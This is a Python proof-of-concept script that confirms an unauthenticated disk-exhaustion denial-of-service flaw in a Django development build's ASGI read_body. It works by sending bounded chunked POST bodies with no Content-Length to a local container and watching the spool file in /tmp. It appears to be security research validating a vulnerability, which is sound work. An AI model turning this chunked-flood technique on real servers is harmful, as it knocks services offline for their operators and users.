#!/usr/bin/env python3
"""
VULN-008 — ASGI handler spools the ENTIRE request body to disk before any size
           check; body_receive_timeout is dead code → unauthenticated
           disk-exhaustion / slow-body DoS (ASGI only).

Target        : Django 6.2.0a0 (commit 9e06baf)
Vulnerable code: targets/django/django/core/handlers/asgi.py:249-267 (read_body)
                 :47 body_receive_timeout = 60 (referenced NOWHERE else -> dead)
                 contrast core/handlers/wsgi.py:74-78 (LimitedStream(content_length),
                 content_length=0 when Content-Length absent -> reads nothing)
Class         : CWE-400 / CWE-770 Uncontrolled Resource Consumption

The flaw
--------
read_body creates SpooledTemporaryFile(max_size=FILE_UPLOAD_MAX_MEMORY_SIZE=2.5MB)
and loops `await receive()` writing every chunk, with:
  * NO running byte total,
  * NO Content-Length consultation,
  * NO timeout (body_receive_timeout is declared but never used).
Past 2.5MB the spool rolls over to a real file in /tmp and keeps growing without
bound. DATA_UPLOAD_MAX_MEMORY_SIZE is only enforced LATER, when request.body/POST
is first accessed — i.e. after the whole body is already on disk. WSGI is immune:
with no Content-Length (chunked) it wraps the stream in LimitedStream(0), reading
nothing.

Validation strategy (BOUNDED — never exhausts the host)
------------------------------------------------------
Primary, deterministic proof: drive the REAL read_body coroutine in-container with
a mock receive() that yields 8 MB in 1 MB chunks, and show it (a) buffers the full
8 MB, (b) rolled the spool over to an on-disk /tmp file, (c) raised NO exception
despite far exceeding the 2.5 MB DATA_UPLOAD_MAX_MEMORY_SIZE (no running total),
and (d) that body_receive_timeout is dead code. Contrast: WSGI LimitedStream with
content_length=0 reads 0 bytes. Secondary: a bounded (4 MB) chunked HTTP POST with
NO Content-Length is accepted by ASGI (proving no CL gate), and best-effort catch
of the on-disk spool file in the asgi container's /tmp.

A successful run proves an unauthenticated client can make ASGI buffer an
unbounded body to disk — the DoS primitive.
"""

import http.client
import os
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C  # noqa: E402

# ---- Primary: drive the real read_body coroutine in the asgi container ----
INCONTAINER = C.django_driver(r"""
import asyncio, json, tempfile
from django.conf import settings
from django.core.handlers.asgi import ASGIHandler
from django.core.handlers.wsgi import LimitedStream
from io import BytesIO

MB = 1024 * 1024
N_MB = 8
handler = ASGIHandler()

# Mock ASGI receive(): 8 messages of 1 MB, last with more_body=False.
msgs = []
for i in range(N_MB):
    msgs.append({"type": "http.request", "body": b"A" * MB, "more_body": (i < N_MB - 1)})
_it = iter(msgs)
async def receive():
    return next(_it)

async def run():
    bf = await handler.read_body(receive)
    bf.seek(0, 2)
    size = bf.tell()
    rolled = getattr(bf, "_rolled", None)
    on_disk_name = None
    try:
        # After rollover the SpooledTemporaryFile delegates to a real file.
        on_disk_name = bf._file.name if hasattr(bf, "_file") else None
    except Exception:
        pass
    bf.close()
    return size, rolled, on_disk_name

size, rolled, name = asyncio.run(run())

# WSGI contrast: no Content-Length (chunked) -> LimitedStream(0) reads nothing.
ls = LimitedStream(BytesIO(b"A" * MB), 0)
wsgi_read = len(ls.read())

print("JSON:" + json.dumps({
    "buffered_bytes": size,
    "expected_bytes": N_MB * MB,
    "rolled_to_disk": bool(rolled),
    "on_disk_name": name,
    "data_upload_max": settings.DATA_UPLOAD_MAX_MEMORY_SIZE,
    "file_upload_max": settings.FILE_UPLOAD_MAX_MEMORY_SIZE,
    "wsgi_limitedstream_read_no_CL": wsgi_read,
}))
""")


def grep_dead_timeout():
    cp = C.dexec_sh("grep -rn body_receive_timeout /opt/django_src/django/ | wc -l "
                    "&& grep -rn body_receive_timeout /opt/django_src/django/")
    return cp.stdout.strip()


def http_chunked_no_cl(port, path, total_mb, delay=0.0):
    """Send a chunked POST with NO Content-Length; return (status, seconds)."""
    t = time.time()
    c = http.client.HTTPConnection("localhost", port, timeout=30)
    c.putrequest("POST", path, skip_accept_encoding=True)
    c.putheader("Transfer-Encoding", "chunked")
    c.putheader("Content-Type", "application/octet-stream")
    c.endheaders()
    chunk = b"A" * (1024 * 1024)
    for _ in range(total_mb):
        c.send(("%x\r\n" % len(chunk)).encode() + chunk + b"\r\n")
        if delay:
            time.sleep(delay)
    c.send(b"0\r\n\r\n")
    r = c.getresponse()
    r.read(64)
    c.close()
    return r.status, round(time.time() - t, 2)


def catch_tmp_spool():
    """Best-effort: while a slow chunked body is in flight to ASGI, poll the asgi
    container's /tmp for the rolled-over spool file (>2.5MB). Returns a description."""
    caught = {"file": None}

    def sender():
        try:
            http_chunked_no_cl(int(C.ASGI_URL.rsplit(":", 1)[1]), "/", 6, delay=0.25)
        except Exception:
            pass

    th = threading.Thread(target=sender, daemon=True)
    th.start()
    for _ in range(40):  # ~2s of polling
        cp = C.dexec_sh("ls -l /tmp/tmp* 2>/dev/null | awk '$5>2500000{print $5, $NF}'",
                        container=C.ASGI_CONTAINER)
        if cp.stdout.strip():
            caught["file"] = cp.stdout.strip().splitlines()[0]
            break
        time.sleep(0.05)
    th.join(timeout=15)
    return caught["file"]


def main():
    C.banner("VULN-008",
             "ASGI unbounded body-spool DoS (read_body has no size/time cap)",
             "core/handlers/asgi.py:249-267 read_body → SpooledTemporaryFile, no running total")

    C.log("STEP", "primary: drive the REAL read_body coroutine in-container with an 8 MB body")
    cp = C.dexec(INCONTAINER)
    import json
    line = next((l for l in cp.stdout.splitlines() if l.startswith("JSON:")), None)
    if not line:
        C.log("FAIL", f"in-container driver failed\nSTDOUT:{cp.stdout}\nSTDERR:{cp.stderr}")
        return C.verdict("VULN-008", "FAILED", "driver error")
    r = json.loads(line[len("JSON:"):])
    C.log("INFO", f"DATA_UPLOAD_MAX_MEMORY_SIZE={r['data_upload_max']} "
                  f"FILE_UPLOAD_MAX_MEMORY_SIZE={r['file_upload_max']}")
    C.log("PROOF", f"read_body buffered {r['buffered_bytes']:,} bytes "
                   f"(= {r['expected_bytes']:,}, the full body) with NO exception, "
                   f"despite DATA_UPLOAD_MAX_MEMORY_SIZE={r['data_upload_max']:,} (no running byte total)")
    C.log("PROOF", f"the spool rolled over to a real on-disk file: rolled_to_disk={r['rolled_to_disk']}, "
                   f"path={r['on_disk_name']}")
    C.log("PROOF", f"WSGI LimitedStream with no Content-Length read {r['wsgi_limitedstream_read_no_CL']} "
                   f"bytes (chunked body ignored — the guard ASGI lacks)")

    C.log("STEP", "confirming body_receive_timeout is dead code (declared, never referenced)")
    dead = grep_dead_timeout()
    n_refs = int(dead.splitlines()[0]) if dead else 0
    C.log("PROOF" if n_refs == 1 else "INFO",
          f"body_receive_timeout appears {n_refs} time(s) in the tree "
          f"(1 = definition only → dead): {dead.splitlines()[-1] if dead else ''}")

    C.log("STEP", "secondary: bounded 4 MB chunked HTTP POST with NO Content-Length")
    try:
        asgi_status, asgi_dt = http_chunked_no_cl(int(C.ASGI_URL.rsplit(":", 1)[1]), "/", 4)
        C.log("PROOF", f"ASGI accepted a 4 MB chunked body with no Content-Length -> HTTP {asgi_status} "
                       f"in {asgi_dt}s (no Content-Length gate; body fully read by read_body)")
    except Exception as e:
        asgi_status = f"ERR {e}"
        C.log("INFO", f"ASGI chunked POST: {asgi_status}")

    C.log("STEP", "best-effort: catch the rolled-over spool file in the asgi container /tmp")
    spool = catch_tmp_spool()
    if spool:
        C.log("PROOF", f"observed on-disk spool file >2.5MB in asgi /tmp during a live request: {spool}")
    else:
        C.log("INFO", "did not catch the transient /tmp file (timing) — in-container proof already decisive")

    C.save_http(C.here(__file__),
                "POST / HTTP/1.1\nHost: localhost:20797\nTransfer-Encoding: chunked\n"
                "Content-Type: application/octet-stream\n\n"
                "<4 MB of body in 1 MB chunks, NO Content-Length>\n0\r\n\r\n",
                f"in-container read_body(8 MB):\n" + json.dumps(r, indent=2) +
                f"\n\nbody_receive_timeout references in tree: {n_refs} (1=dead)\n{dead}\n"
                f"\nHTTP: ASGI 4MB chunked (no CL) -> HTTP {asgi_status}\n"
                f"caught on-disk spool file: {spool}\n")

    ok = (r["buffered_bytes"] == r["expected_bytes"]
          and r["buffered_bytes"] > r["data_upload_max"]
          and r["rolled_to_disk"]
          and r["wsgi_limitedstream_read_no_CL"] == 0
          and n_refs == 1)
    if ok:
        C.log("OK", "exploit confirmed — ASGI read_body buffers an unbounded body to disk with no "
                    "size/time cap (WSGI does not); an unauth chunked flood exhausts /tmp / workers")
        return C.verdict("VULN-008", "CONFIRMED",
                         "ASGI read_body spools entire (8 MB demo) body to disk past the 2.5 MB limit "
                         "with no running total and a dead body_receive_timeout; WSGI immune")
    return C.verdict("VULN-008", "FAILED", "unbounded-spool behavior not fully reproduced")


if __name__ == "__main__":
    sys.exit(main())
